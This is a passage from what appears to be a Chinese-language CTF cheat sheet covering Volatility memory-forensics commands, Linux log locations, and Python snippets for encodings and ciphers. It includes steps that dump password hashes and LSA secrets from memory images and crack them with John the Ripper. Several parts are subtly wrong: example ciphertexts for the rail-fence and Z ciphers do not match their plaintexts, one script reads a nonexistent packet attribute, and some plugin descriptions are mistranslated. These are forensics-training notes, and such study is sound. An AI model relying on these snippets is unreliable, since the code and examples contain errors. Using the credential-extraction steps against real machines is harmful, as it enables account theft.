linux_psxview              - 使用各种进程列表查找隐藏进程
linux_recover_filesystem   - 从内存中恢复整个缓存文件系统
linux_route_cache          - 从内存中恢复路由缓存 
linux_sk_buff_cache        - 从 sk_buff kmem_cache 中恢复数据包
linux_slabinfo             - 在运行的机器上模拟 /proc/slabinfo
linux_strings              - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）
linux_threads              - 打印进程的线程 
linux_tmpfs                - 从内存中恢复 tmpfs 文件系统
linux_truecrypt_passphrase - 恢复缓存的 Truecrypt 密码
linux_vma_cache            - 从 vm_area_struct 缓存中收集 VMA 
linux_volshell             - 内存映像中的 Shell 
linux_yarascan             - Linux 内存映像中的 shell
lsadump                    - 从注册表中转储（解密的）LSA 机密
mac_adium                  - 列出 Adium 消息
mac_apihooks               - 检查进程中的 API 挂钩
mac_apihooks_kernel        - 检查系统调用和内核函数是否被挂钩 
mac_arp                    - 打印 arp 表
mac_bash                   - 从 bash 进程内存中恢复 bash 历史记录
mac_bash_env               - 恢复 bash 的环境变量
mac_bash_hash              - 从 bash 进程内存中恢复 bash 哈希表
mac_calendar               - 从 Calendar.app 获取日历事件
mac_check_fop              - 验证文件操作指针 
mac_check_mig_table        - 列出内核 MIG 表中的整体
mac_check_syscall_shadow   - 查找影子系统调用表 
mac_check_syscalls         - 检查系统调用表条目是否被挂钩 
mac_check_sysctl           - 检查未知的 sysctl 处理程序
mac_check_trap_table       - 检查 mach 陷阱表条目是否被钩住
mac_compressed_swap        - 打印 Mac OS X VM 压缩器统计数据并转储所有压缩页面
mac_contacts               - 从 Contacts.app 获取联系人姓名 
mac_dead_procs             - 打印终止/取消分配的进程
mac_dead_sockets           - 打印终止/取消分配的网络套接字
mac_dead_vnodes            - 列出释放的 vnode 结构
mac_devfs                  - 列出文件缓存中的文件 
mac_dmesg                  - 打印内核调试缓冲区 
mac_dump_file              - 转储指定文件 
mac_dump_maps              - 转储进程的内存范围，可选地包括压缩交换中的页面 
mac_dyld_maps              - 从 dyld 数据结构中获取进程的内存映射
mac_find_aslr_shift        - 查找 10.8+ 图像的 ASLR 移位值
mac_get_profile            - 自动检测 Mac 配置文件
mac_ifconfig               - 列出所有设备的网络接口信息 
mac_interest_handlers      - 列出 IOKit 兴趣处理程序 
mac_ip_filters             - 报告任何挂钩的 IP 过滤器
mac_kernel_classes         - 列出内核中加载的 c++ 类
mac_kevents                - 显示进程的父/子关系
mac_keychaindump           - 恢复可能的钥匙串密钥。 使用chainbreaker打开相关的keychain文件
mac_ldrmodules             - 将 proc 映射的输出与 libdl 中的库列表进行比较
mac_librarydump            - 转储进程的可执行文件 
mac_list_files             - 列出文件缓存中的文件 
mac_list_kauth_listeners   - 列出 Kauth Scope 监听器 
mac_list_kauth_scopes      - 列出 Kauth 范围及其状态
mac_list_raw               - 列出具有混杂套接字的应用程序 
mac_list_sessions          - 枚举会话 
mac_list_zones             - 打印活动区域 
mac_lsmod                  - 列出加载的内核模块 
mac_lsmod_iokit            - 列出通过 IOkit 加载的内核模块
mac_lsmod_kext_map         - 列出加载的内核模块 
mac_lsof                   - 列出每个进程打开的文件 
mac_machine_info           - 打印有关样本的机器信息 
mac_malfind                - 寻找可疑的进程映射 
mac_memdump                - 将可寻址内存页转储到文件中 
mac_moddump                - 将指定的内核扩展写入磁盘 
mac_mount                  - 打印挂载的设备信息 
mac_netstat                - 列出每个进程的活动网络连接 
mac_network_conns          - 列出来自内核网络结构的网络连接 
mac_notesapp               - 查找 Notes 消息的内容
mac_notifiers              - 检测将钩子添加到 I/O 工具包中的 rootkit（例如 LogKext）
mac_orphan_threads         - 列出不映射回已知模块/进程的线程
mac_pgrp_hash_table        - 遍历进程组哈希表 
mac_pid_hash_table         - 遍历 pid 哈希表
mac_print_boot_cmdline     - 打印内核启动参数 
mac_proc_maps              - 获取进程的内存映射 
mac_procdump               - 转储进程的可执行文件 
mac_psaux                  - 在用户区打印带有参数的进程 (**argv)
mac_psenv                  - 在用户空间打印带有环境的进程 (**envp)
mac_pslist                 - 列出正在运行的进程 
mac_pstree                 - 显示进程的父/子关系
mac_psxview                - 使用各种进程列表查找隐藏进程 
mac_recover_filesystem     - 恢复缓存的文件系统 
mac_route                  - 打印路由表 
mac_socket_filters         - 报告套接字过滤器 
mac_strings                - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）
mac_tasks                  - 列出活动任务 
mac_threads                - 列出进程线程 
mac_threads_simple         - 列出线程及其开始时间和优先级 
mac_timers                 - 报告内核驱动程序设置的定时器 
mac_trustedbsd             - 列出恶意的trustedbsd 策略
mac_version                - 打印 Mac 版本
mac_vfsevents              - 列出过滤文件系统事件的进程 
mac_volshell               - 内存映像中的外壳 
mac_yarascan               - 扫描内存中的 yara 签名 
machoinfo                  - 转储 Mach-O 文件格式信息
malfind                    - 查找隐藏和注入的代码 
mbrparser                  - 扫描并解析潜在的主引导记录 (MBR)
memdump                    - 转储进程的可寻址内存 
memmap                     - 打印内存映射 
messagehooks               - 列出桌面和线程窗口消息挂钩 
mftparser                  - 扫描并解析潜在的 MFT 条目
moddump                    - 将内核驱动程序转储到可执行文件示例 
modscan                    - 内核模块的池扫描器 
modules                    - 打印加载模块的列表 
multiscan                  - 一次扫描各种对象 
mutantscan                 - 互斥对象的池扫描器 
netscan                    - 扫描 Vista（或更高版本）图像的连接和套接字 
notepad                    - 列出当前显示的记事本文本 
objtypescan                - 扫描 Windows 对象类型对象
patcher                    - 基于页面扫描修补内存 
poolpeek                   - 可配置的池扫描器插件 
pooltracker                - 显示池标签使用的摘要 
printkey                   - 打印注册表项及其子项和值 
privs                      - 显示进程权限 
procdump                   - 将进程转储到可执行文件示例 
pslist                     - 按照 EPROCESS 列表打印所有正在运行的进程
psscan                     - 进程对象的池扫描器 
pstree                     - 将进程列表打印为树 
psxview                    - 使用各种进程列表查找隐藏进程 
qemuinfo                   - 转储 Qemu 信息
raw2dmp                    - 将物理内存样本转换为 windbg 故障转储
screenshot                 - 保存基于 GDI 窗口的伪截图
servicediff                - 列出 Windows 服务（ala Plugx）
sessions                   - 列出 _MM_SESSION_SPACE 的详细信息（用户登录会话）
shellbags                  - 打印 ShellBags 信息
shimcache                  - 解析应用程序兼容性 Shim Cache 注册表项
shutdowntime               - 从注册表打印机器的 ShutdownTime
sockets                    - 打印打开的套接字列表 
sockscan                   - tcp 套接字对象的池扫描器
ssdt                       - 显示 SSDT 条目
strings                    - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）
svcscan                    - 扫描 Windows 服务
symlinkscan                - 符号链接对象的池扫描器 
thrdscan                   - 线程对象的池扫描器 
threads                    - 调查 _ETHREAD 和 _KTHREADs
timeliner                  - 从内存中的各种工件创建时间线 
timers                     - 打印内核定时器和相关的模块 DPC
truecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥
truecryptpassphrase        - TrueCrypt 缓存密码短语查找器
truecryptsummary           - TrueCrypt 总结
unloadedmodules            - 打印已卸载模块的列表 
userassist                 - 打印 userassist 注册表项和信息
userhandles                - 转储 USER 句柄表
vaddump                    - 将 vad 部分转储到文件中
vadinfo                    - 转储 VAD 信息
vadtree                    - 遍历 VAD 树并以树格式显示
vadwalk                    - 走 VAD 树
vboxinfo                   - 转储 virtualbox 信息 
verinfo                    - 从 PE 图像中打印出版本信息
vmwareinfo                 - 转储 VMware VMSS/VMSN 信息
volshell                   - 内存映像中的 Shell
win10cookie                - 查找 Windows 10 的 ObHeaderCookie 值 
windows                    - 打印桌面窗口（详细信息）
wintree                    - 打印Z顺序桌面Windows树
wndscan                    - 用于窗口站的池扫描仪
yarascan                   - 使用 Yara 签名扫描进程或内核内存
 
 
Scanner Checks
--------------
CheckPoolSize          - 检查池块大小
CheckPoolType          - 检查池类型
KPCRScannerCheck       - 检查自引用指针以查找KPCR
MultiPrefixFinderCheck - 每页检查多个字符串，在偏移处完成
MultiStringFinderCheck - 每页检查多个字符串
PoolTagCheck           - 此扫描程序检查池标记的出现
```

### 1、命令格式

```
volatility -f [对象文件] --profile=[操作系统] [插件参数]
volatility -f [对象文件] imageinfo # 获取镜像信息
volatility -f [对象文件] --profile=[操作系统] volshell #判断是否可以正常处理镜像
```

### 1. 查看用户
```bash
volatility -f 1.vmem --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"
```

### 2. 查看用户名和密码信息（hashdump）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 hashdump
```

### 3. 使用 lsadump 获取强密码
```bash
volatility -f 1.vmem --profile=Win7SP1x64 lsadump
```

### 4. 查看进程列表（pslist）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 pslist
```

### 5. 查看特定进程（pslist）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588
```

### 6. 扫描隐藏或解链的进程（psscan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 psscan
```

### 7. 查询服务（svcscan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 svcscan
```

### 8. 查看浏览器历史记录（iehistory）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 iehistory
```

### 9. 查看网络连接（netscan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 netscan
```

### 10. 查看网络连接（connscan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 connscan
```

### 11. 查看网络连接（connections）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 connections
```

### 12. 查看命令行操作（cmdscan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 cmdscan
```

### 13. 查看进程命令行参数（cmdline）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 cmdline
```

### 14. 扫描所有文件列表（filescan）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 filescan
```
例子:
```bash
volatility -f 1.vmem --profile=Win7SP1x64 filescan | grep "flag.txt"
```

### 15. 查看文件内容（dumpfiles）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x12345678 -D ./
```

### 16. 查看当前展示的 notepad 内容（notepad）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 notepad
```

### 17. 查看编辑控件信息（editbox）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 editbox
```

### 18. 提取进程（memdump）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 memdump -p 332 --dump-dir=./
```
提取出的进程文件可以使用 Foremost 来分离其中的文件:
```bash
foremost -i 332.dmp -o output_directory
```
或者使用 `strings` 工具来搜索特定内容:
```bash
strings -e l 332.dmp | grep flag
```

### 19. 屏幕截图（screenshot）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./
```

### 20. 查看注册表配置单元（hivelist）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 hivelist
```

### 21. 查看注册表键名（hivedump）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410
```

### 22. 查看注册表键值（printkey）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
```

### 23. 列出用户名（printkey）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"
```

### 24. 查看运行程序记录（userassist）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 userassist
```

### 25. 最大程序提取信息（timeliner）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 timeliner
```

### 26. 查看剪贴板信息（clipboard）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 clipboard
```

### 27. 显示详细配置信息（systeminfo）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 systeminfo
```

### 28. 恢复被删除的文件（mftparser）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 mftparser
```

### 29. 查看环境变量（envars）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 envars
```

### 30. 列出某进程加载的所有 DLL 文件（dlllist）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588
```

### 31. 列出程序版本信息（verinfo）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 verinfo
```

### 32. 查看进程树（pstree）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 pstree
```

### 33. 查找异常程序（shimcache）
```bash
volatility -f 1.vmem --profile=Win7SP1x64 shimcache
```

### 具体示例

#### 1. 从 `hashdump` 中获取密码哈希并使用 John the Ripper 进行破解
```bash
volatility -f 1.vmem --profile=Win7SP1x64 hashdump > hashes.txt
john --format=NT hashes.txt
```

#### 2. 从 `memdump` 提取的进程文件中查找 flag
```bash
volatility -f 1.vmem --profile=Win7SP1x64 memdump -p 332 --dump-dir=./
strings -e l 332.dmp | grep flag
```

#### 3. 使用 `foremost` 分离进程文件中的内容
```bash
foremost -i 332.dmp -o output_directory
```

### 补充说明
1. **提取出的文件分析**: 提取出的文件可以使用 `strings`、`grep` 等工具进行内容分析，也可以使用 `foremost` 进行文件分离。
2. **环境变量**: 使用 `envars` 插件可以查看内存镜像中的环境变量，这对于了解系统配置和运行环境非常有帮助。
3. **时间线分析**: `timeliner` 插件可以将所有操作系统事件以时间线的方式展示，帮助分析事件发生的顺序和时间点。



## LINUX

```bash
last
lastb
lastlog
/var/log/

/etc/sshd
/etc/login.conf

contab
	/var/spool/cron/
	/etc/crontab
```



## Python 常用代码

读取指定ICMP区域拼接flag

```python
import pyshark

cap = pyshark.FileCapture('ping.pcapng', display_filter="icmp && icmp.type==8")
cap.load_packets()

flag = ""
for packet in cap:
    data_hex = packet.icmp.data
    flag += chr(int(data_hex[12:14]))
print(flag)

cap.close()
```

二进制转str 32/64 0/1 此处为ICMP data长度

```python
import pyshark

cap = pyshark.FileCapture('icmp_len_binary.pcap', display_filter="icmp && icmp.type==8")
cap.load_packets()

flag_str = ""
for packet in cap:
    if packet.icmp.data.data_lan == 32:
        flag_str += '0'
    elif packet.icmp.data.data_lan == 64:
        flag_str += '1'
print(flag_str)

cap.close()
```

ASCII转STR

```python
list = [
    99,
    116,
    102,
    104,
    117,
    98,
    123,
    97,
    99,
    54
]

character = ""
for i in list:
    character += chr(i)
print(character)
```

HEX转STR

```python
hex_value = '68656c6c6f20776f726c64'
str_value = bytes.fromhex(hex_value).decode('utf-8')
print(str_value)
```

Base64 编码/解码

```python
import base64

# Base64 编码
def base64_encode(data):
    encoded_data = base64.b64encode(data.encode())
    return encoded_data.decode()

# Base64 解码
def base64_decode(encoded_data):
    decoded_data = base64.b64decode(encoded_data.encode())
    return decoded_data.decode()

# 示例
data = "Hello, CTF!"
encoded = base64_encode(data)
decoded = base64_decode(encoded)
print(f"Encoded: {encoded}")
print(f"Decoded: {decoded}")
```

Caesar 密码

```python
def caesar_encrypt(text, shift):
    encrypted = ""
    for char in text:
        if char.isalpha():
            shift_amount = 65 if char.isupper() else 97
            encrypted += chr((ord(char) + shift - shift_amount) % 26 + shift_amount)
        else:
            encrypted += char
    return encrypted

def caesar_decrypt(text, shift):
    return caesar_encrypt(text, -shift)

# 示例
text = "HELLO"
shift = 3
encrypted = caesar_encrypt(text, shift)
decrypted = caesar_decrypt(encrypted, shift)
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

Caesar 密码破解

```python
def caesar_decrypt(text, shift):
    decrypted = ""
    for char in text:
        if char.isalpha():
            shift_amount = 65 if char.isupper() else 97
            decrypted += chr((ord(char) - shift - shift_amount) % 26 + shift_amount)
        else:
            decrypted += char
    return decrypted

# 尝试所有可能的偏移量
def caesar_crack(ciphertext):
    for shift in range(26):
        decrypted = caesar_decrypt(ciphertext, shift)
        print(f"Shift {shift}: {decrypted}")

# 示例
ciphertext = "KHOOR ZRUOG"  # HELLO WORLD with a shift of 3
caesar_crack(ciphertext)
```

XOR 加密/解密

```python
def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(data))

# 示例
data = "CTF is fun!"
key = "key"
encrypted = xor_encrypt_decrypt(data, key)
decrypted = xor_encrypt_decrypt(encrypted, key)
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

XOR 密码破解

```python
def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(data))

# 暴力破解密钥
def xor_crack(ciphertext):
    # 试图从已知明文中获取线索
    for key in range(256):
        key_char = chr(key)
        decrypted = xor_encrypt_decrypt(ciphertext, key_char)
        print(f"Key {key_char}: {decrypted}")

# 示例
ciphertext = xor_encrypt_decrypt("Hello, CTF!", "k")  # Encrypted with key 'k'
xor_crack(ciphertext)
```

反射破解自定义编码

```python
def rot13(text):
    result = []
    for char in text:
        if char.isalpha():
            shift = 13
            if char.islower():
                result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            else:
                result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

# 示例
encoded_text = "Uryyb, PGS!"
decoded_text = rot13(encoded_text)  # Rot13 is symmetric
print(f"Decoded: {decoded_text}")
```

AES 加密/解密

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return cipher.iv + ct_bytes

def aes_decrypt(ct, key):
    iv = ct[:16]
    ct = ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

# 示例
data = "Secret Message"
key = get_random_bytes(16)  # AES key must be either 16, 24, or 32 bytes long
encrypted = aes_encrypt(data, key)
decrypted = aes_decrypt(encrypted, key)
print(f"Encrypted: {encrypted.hex()}")
print(f"Decrypted: {decrypted}")
```

RSA 加密/解密

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# 生成 RSA 密钥对
def generate_rsa_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

# RSA 加密
def rsa_encrypt(data, public_key):
    recipient_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    return cipher_rsa.encrypt(data.encode())

# RSA 解密
def rsa_decrypt(encrypted_data, private_key):
    private_key = RSA.import_key(private_key)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_data).decode()

# 示例
private_key, public_key = generate_rsa_keys()
data = "RSA Secret"
encrypted = rsa_encrypt(data, public_key)
decrypted = rsa_decrypt(encrypted, private_key)
print(f"Encrypted: {encrypted.hex()}")
print(f"Decrypted: {decrypted}")
```

RSA 破解

```python
from Crypto.PublicKey import RSA
import gmpy2

# RSA 参数
n = 3233  # 公钥模数
e = 17    # 公钥指数
ciphertext = 855  # 加密后的密文

# 因数分解 n
p = 61
q = 53

# 计算私钥 d
phi = (p - 1) * (q - 1)
d = int(gmpy2.invert(e, phi))

# 解密
def rsa_decrypt(ciphertext, d, n):
    return pow(ciphertext, d, n)

decrypted_message = rsa_decrypt(ciphertext, d, n)
print(f"Decrypted message: {decrypted_message}")
```

MD5 哈希

```python
import hashlib

def md5_hash(data):
    hash_object = hashlib.md5(data.encode())
    return hash_object.hexdigest()

# 示例
data = "CTF123"
hashed = md5_hash(data)
print(f"MD5 Hash: {hashed}")
```

围栏密码加密

```python
def fence_cipher_encrypt(plaintext, num_rails):
    if num_rails == 1:
        return plaintext

    rail = [''] * num_rails
    direction = -1  # 1 for down, -1 for up
    row = 0

    for char in plaintext:
        rail[row] += char
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    return ''.join(rail)

# 示例
plaintext = "HELLOCTF"
num_rails = 3
encrypted = fence_cipher_encrypt(plaintext, num_rails)
print(f"Encrypted: {encrypted}")
```

围栏密码解密

```python
def fence_cipher_decrypt(ciphertext, num_rails):
    if num_rails == 1:
        return ciphertext

    rail = [''] * num_rails
    direction = -1
    row = 0
    idx = 0

    for i in range(len(ciphertext)):
        rail[row] += '*'
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    for r in range(num_rails):
        for i in range(len(rail[r])):
            if rail[r][i] == '*':
                rail[r] = rail[r][:i] + ciphertext[idx] + rail[r][i+1:]
                idx += 1

    plaintext = []
    direction = -1
    row = 0
    for i in range(len(ciphertext)):
        plaintext.append(rail[row][0])
        rail[row] = rail[row][1:]
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    return ''.join(plaintext)

# 示例
encrypted = "HLEOTCLF"  # From the previous encryption example
decrypted = fence_cipher_decrypt(encrypted, num_rails)
print(f"Decrypted: {decrypted}")

```

W密码加密

```python
def w_cipher_encrypt(plaintext, num_rails):
    if num_rails == 1:
        return plaintext

    rail = [''] * num_rails
    direction = -1  # 1 for down, -1 for up
    row = 0

    for char in plaintext:
        rail[row] += char
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    return ''.join(rail)

# 示例
plaintext = "HELLOWORLD"
num_rails = 3
encrypted = w_cipher_encrypt(plaintext, num_rails)
print(f"Encrypted: {encrypted}")

```

W密码解密

```python
def w_cipher_decrypt(ciphertext, num_rails):
    if num_rails == 1:
        return ciphertext

    rail = [''] * num_rails
    direction = -1
    row = 0
    idx = 0

    for i in range(len(ciphertext)):
        rail[row] += '*'
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    for r in range(num_rails):
        for i in range(len(rail[r])):
            if rail[r][i] == '*':
                rail[r] = rail[r][:i] + ciphertext[idx] + rail[r][i+1:]
                idx += 1

    plaintext = []
    direction = -1
    row = 0
    for i in range(len(ciphertext)):
        plaintext.append(rail[row][0])
        rail[row] = rail[row][1:]
        if row == 0 or row == num_rails - 1:
            direction *= -1
        row += direction

    return ''.join(plaintext)

# 示例
encrypted = "HOEWRLOLLD"  # 从前面的加密示例中得到
decrypted = w_cipher_decrypt(encrypted, num_rails)
print(f"Decrypted: {decrypted}")

```

Z密码

```python
def z_cipher_encrypt(plaintext, num_rails):
    if num_rails == 1:
        return plaintext

    rail = [''] * num_rails
    row = 0
    step = 1

    for char in plaintext:
        rail[row] += char
        if row == 0:
            step = 1
        elif row == num_rails - 1:
            step = -1
        row += step

    return ''.join(rail)

# 示例
plaintext = "HELLOWORLD"
num_rails = 3
encrypted = z_cipher_encrypt(plaintext, num_rails)
print(f"Encrypted: {encrypted}")

```

Z密码解密

```python
def z_cipher_decrypt(ciphertext, num_rails):
    if num_rails == 1:
        return ciphertext

    rail = [''] * num_rails
    idx = 0
    row = 0
    step = 1

    for char in ciphertext:
        rail[row] += '*'
        if row == 0:
            step = 1
        elif row == num_rails - 1:
            step = -1
        row += step

    for r in range(num_rails):
        rail[r] = list(rail[r])

    for r in range(num_rails):
        for i in range(len(rail[r])):
            if rail[r][i] == '*':
                rail[r][i] = ciphertext[idx]
                idx += 1

    row = 0
    step = 1
    plaintext = []

    for i in range(len(ciphertext)):
        plaintext.append(rail[row][0])
        rail[row] = rail[row][1:]
        if row == 0:
            step = 1
        elif row == num_rails - 1:
            step = -1
        row += step

    return ''.join(plaintext)

# 示例
encrypted = "HORELLOLLWLD"  # 从前面的加密示例中得到
decrypted = z_cipher_decrypt(encrypted, num_rails)
print(f"Decrypted: {decrypted}")

```

Pigpen 密码图示

```
 1. Grid:
  +---+---+---+
  | A | B | C |
  +---+---+---+
  | D | E | F |
  +---+---+---+
  | G | H | I |
  +---+---+---+

 2. X:
   \ /   / \
    V    \ /
  / \     V
 /   \   / \

```

Pigpen 密码加密

```python
pigpen_cipher = {
    'A': '🅰️', 'B': '🅱️', 'C': '©️',
    'D': '🔲', 'E': '🔳', 'F': '🔴',
    'G': '🟢', 'H': '🔵', 'I': '🟠',
    'J': '🟣', 'K': '🔺', 'L': '🔻',
    'M': '🔸', 'N': '🔹', 'O': '🔶',
    'P': '🔷', 'Q': '🔺', 'R': '🔻',
    'S': '🔸', 'T': '🔹', 'U': '🔶',
    'V': '🔷', 'W': '🔺', 'X': '🔻',
    'Y': '🔸', 'Z': '🔹'
}

def pigpen_encrypt(plaintext):
    encrypted = ''.join(pigpen_cipher.get(char.upper(), char) for char in plaintext)
    return encrypted

# 示例
plaintext = "HELLOWORLD"
encrypted = pigpen_encrypt(plaintext)
print(f"Encrypted: {encrypted}")

```

Pigpen 密码解密

```python
reverse_pigpen_cipher = {v: k for k, v in pigpen_cipher.items()}

def pigpen_decrypt(ciphertext):
    decrypted = ''.join(reverse_pigpen_cipher.get(char, char) for char in ciphertext)
    return decrypted

# 示例
encrypted = pigpen_encrypt(plaintext)
decrypted = pigpen_decrypt(encrypted)
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")

```

通用ROT密码加密和解密函数

```python
def rot_cipher(text, shift):
    result = []

    for char in text:
        if char.isalpha():
            shift_amount = 65 if char.isupper() else 97
            result.append(chr((ord(char) - shift_amount + shift) % 26 + shift_amount))
        else:
            result.append(char)

    return ''.join(result)

# 加密函数
def rot_encrypt(plaintext, shift):
    return rot_cipher(plaintext, shift)

# 解密函数
def rot_decrypt(ciphertext, shift):
    return rot_cipher(ciphertext, -shift)

# 示例
plaintext = "HELLO, WORLD!"
shift = 13

encrypted = rot_encrypt(plaintext, shift)
decrypted = rot_decrypt(encrypted, shift)

print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")

```

ROT13实现

```python
def rot13(text):
    return rot_cipher(text, 13)

# 示例
plaintext = "HELLO, WORLD!"
encrypted = rot13(plaintext)
decrypted = rot13(encrypted)

print(f"ROT13 Encrypted: {encrypted}")
print(f"ROT13 Decrypted: {decrypted}")

```

修复或调整图像的宽度和高度

```python
from PIL import Image

def resize_image(input_image_path, output_image_path, width=None, height=None, keep_aspect_ratio=False):
    with Image.open(input_image_path) as image:
        original_width, original_height = image.size
        if keep_aspect_ratio:
            if width and height:
                aspect_ratio = min(width/original_width, height/original_height)
                width = int(original_width * aspect_ratio)
                height = int(original_height * aspect_ratio)
            elif width:
                aspect_ratio = width / original_width
                height = int(original_height * aspect_ratio)
            elif height:
                aspect_ratio = height / original_height
                width = int(original_width * aspect_ratio)
            else:
                raise ValueError("Either width or height must be provided.")
        else:
            if not width or not height:
                raise ValueError("Both width and height must be provided if not keeping aspect ratio.")
        
        resized_image = image.resize((width, height))
        resized_image.save(output_image_path)
        print(f"Image saved to {output_image_path} with size {width}x{height}")

def repair_image(input_image_path, output_image_path):
    try:
        with Image.open(input_image_path) as image:
            image.verify()  # 验证图像文件是否完整
        print("Image is valid")
    except (IOError, SyntaxError) as e:
        print("Image is corrupted:", e)
        return

    # 如果图像有效，尝试重新保存
    with Image.open(input_image_path) as image:
        image.save(output_image_path)
        print(f"Image repaired and saved to {output_image_path}")

# 示例
input_image_path = 'input_image.jpg'
output_image_path = 'output_image.jpg'
new_width = 800
new_height = 600

# 调整图像大小
resize_image(input_image_path, output_image_path, width=new_width, height=new_height, keep_aspect_ratio=True)

# 修复图像
corrupted_image_path = 'corrupted_image.jpg'
repaired_image_path = 'repaired_image.jpg'
repair_image(corrupted_image_path, repaired_image_path)

```

